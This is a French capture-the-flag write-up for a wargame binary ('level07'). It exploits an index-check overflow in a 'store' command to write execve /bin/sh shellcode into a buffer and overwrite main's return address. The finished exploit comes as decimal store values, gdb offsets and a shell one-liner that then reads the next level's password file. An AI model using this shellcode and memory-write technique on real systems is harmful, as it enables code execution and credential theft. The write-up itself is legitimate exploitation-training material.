L'executable nous ouvre "wil's crappy number storage service", qui lis sur
l'entree standard et interprete le resultat comme des commandes. Il y a 3
commandes:
- store: ecris 4 octets dans un tableau d'int a n'importe quel offset qui n'est
pas un multiple de 3
- read: lis 4 octets n'importe ou
- quit: sors de la boucle principale, vers le return du main

Comme aucune limite d'addresse n'est mise, on peux ecrire dans toute la memoire
disponible. A l'ecriture, comme on ne peux ecrire qu'a des index qui ne sont pas
des multiples de 3, mais que le check est effectue avant la multiplication par 4
(car tableau d'int), il est possible d'overflow, et d'ecrire dans chaque octet
de la memoire. Il n'est pas possible que l'octet de poids fort de la valeur
ecrite soit 0xb7, ce qui ne change strictement rien dans notre cas.

La marche a suivre est donc evidente:
-on met un shellcode dans le buffer (j'aime souffrir)
-on change la valeur de retour pour celle du buffer

Pour overflow, on ajoute 0x100000000 / 4 a notre valeur (1073741824).

Notre shellcode fait 23 octets, soit 6*4 octets. Il va donc falloir 6 commandes
store, chacune en decimal, et avec un offset augmente de 1073741824 pour les
multiples de 3 pour overflow :
- 0xC931C031 (3375480881)	-> offset 0 (1073741824)
- 0x6850D231 (1750127153)	-> offset 1 (1)
- 0x68732F6E (1752379246)	-> offset 2 (2)
- 0x622F2F68 (1647259496)	-> offset 3 (1073741827)
- 0xB0E38969 (2967701865)	-> offset 4 (4)
- 0x0080CD0B (8441099)		-> offset 5 (5)

Dans gdb, l'addresse de notre buffer est 0xffffd544.
L'addresse de retour de fgets est de:  
-0xffffd6d8 dans gdb  
-0xffffd6f8 en execution normale  
On en deduit donc que la difference est de 0x20 (32) octets, et que l'addresse
du buffer en execution normale est 0xffffd564.

On trouve dans gdb avec info frame que l'addresse de la valeur de return du main
est a 0xffffd70c, soit une difference de 456 avec l'addresse du buffer.  
456 / 4 = 114, l'offset de la valeur de return est donc de 114.

On fait donc un dernier store a l'offset 114 + 1073741824 pour overflow, de la
valeur de l'addresse du buffer (0xffffd564, 4294956388 en decimal):

	$ echo -en "store\n3375480881\n1073741824\nstore\n1750127153\n1\nstore\n1752379246\n2\nstore\n1647259496\n1073741827\nstore\n2967701865\n4\nstore\n8441099\n5\nstore\n4294956388\n1073741938\nquit\n" > /tmp/in
	$ (cat /tmp/in; echo "cat /home/users/level08/.pass") | ./level07
